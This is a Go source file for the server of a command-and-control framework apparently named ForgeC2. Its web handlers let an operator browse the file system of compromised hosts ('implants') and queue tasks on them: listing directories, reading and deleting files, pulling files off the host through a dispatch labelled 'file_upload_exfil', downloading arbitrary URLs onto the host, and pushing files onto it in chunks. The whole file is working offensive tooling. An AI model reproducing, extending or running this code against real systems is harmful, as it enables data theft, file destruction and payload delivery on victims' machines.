package server

import (
	"encoding/base64"
	"io"
	"log/slog"
	"mime/multipart"
	"net/http"
	"strconv"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

func (s *Server) handleFileBrowserPage(c *gin.Context) {
	id := c.Param("id")

	var agent db.Implant
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		c.Redirect(http.StatusFound, "/agents")
		return
	}

	stats := s.getNavStats()
	data := gin.H{
		"Title":     "ForgeC2 - File Browser",
		"Agent":     agent,
		"Path":      c.Query("path"),
		"ActiveNav": "agents",
		"Online":    time.Since(agent.LastSeen) < s.offlineThreshold(),
	}
	for k, v := range stats {
		data[k] = v
	}

	s.renderPage(c, "files_content", data)
}

func (s *Server) handleListDir(c *gin.Context) {
	id := c.Param("id")
	path := c.PostForm("path")
	if path == "" {
		path = "C:\\"
	}

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "ls", path, "", path, "", 0, 0)
	if err != nil {
		slog.Error("Failed to create task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	slog.Info("Directory list requested", "agent", id, "path", path)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}

func (s *Server) handleFileDelete(c *gin.Context) {
	id := c.Param("id")
	filePath := c.PostForm("path")
	if filePath == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "file path required"})
		return
	}

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "delete", filePath, "", filePath, "", 0, 0)
	if err != nil {
		slog.Error("Failed to create task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	slog.Info("File delete requested", "agent", id, "path", filePath)
	s.dispatchTask(c, task, "file_delete", filePath)
}

func (s *Server) handleFileRead(c *gin.Context) {
	id := c.Param("id")
	filePath := c.PostForm("path")
	if filePath == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "file path required"})
		return
	}

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "read", filePath, "", filePath, "", 0, 0)
	if err != nil {
		slog.Error("Failed to create task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	slog.Info("File read requested", "agent", id, "path", filePath)
	s.dispatchTask(c, task, "file_read", filePath)
}

func (s *Server) handleFileUploadFromAgent(c *gin.Context) {
	id := c.Param("id")
	filePath := c.PostForm("path")
	if filePath == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "file path required"})
		return
	}

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "upload", filePath, "", filePath, "", 0, 0)
	if err != nil {
		slog.Error("Failed to create task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	slog.Info("File upload requested", "agent", id, "path", filePath)
	s.dispatchTask(c, task, "file_upload_exfil", filePath)
}

func (s *Server) handleDownload(c *gin.Context) {
	id := c.Param("id")
	fileURL := c.PostForm("url")
	targetPath := c.PostForm("path")

	if fileURL == "" || targetPath == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "url and path required"})
		return
	}

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "download", fileURL, targetPath, targetPath, "", 0, 0)
	if err != nil {
		slog.Error("Failed to create task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	slog.Info("File download requested", "agent", id, "url", fileURL, "path", targetPath)
	s.dispatchTask(c, task, "file_download_url", fileURL+" -> "+targetPath)
}

func (s *Server) handleUploadFile(c *gin.Context) {
	id := c.Param("id")
	targetPath := c.PostForm("target_path")
	if targetPath == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "target path required"})
		return
	}

	file, err := c.FormFile("file")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "file required"})
		return
	}

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	if file.Size > MaxUploadSize {
		c.JSON(http.StatusBadRequest, gin.H{"error": "file too large (max 50MB)"})
		return
	}

	fileData, err := readFileToBase64(file)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read file"})
		return
	}

	task, err := s.createTask(id, "upload", targetPath, "", targetPath, fileData, 0, 0)
	if err != nil {
		slog.Error("Failed to create task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	// chunked support
	if offsetStr := c.PostForm("offset"); offsetStr != "" {
		if off, err := strconv.ParseInt(offsetStr, 10, 64); err == nil {
			task.Offset = off
			s.db.Save(task)
		}
	}
	s.LogAuditRecord(c, "file_upload_push", "agent", id, targetPath, true, nil)

	slog.Info("File upload chunk requested", "agent", id, "path", targetPath, "offset", task.Offset)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}

func readFileToBase64(file *multipart.FileHeader) (string, error) {
	f, err := file.Open()
	if err != nil {
		return "", err
	}
	defer f.Close()

	data, err := io.ReadAll(f)
	if err != nil {
		return "", err
	}

	return base64.StdEncoding.EncodeToString(data), nil
}
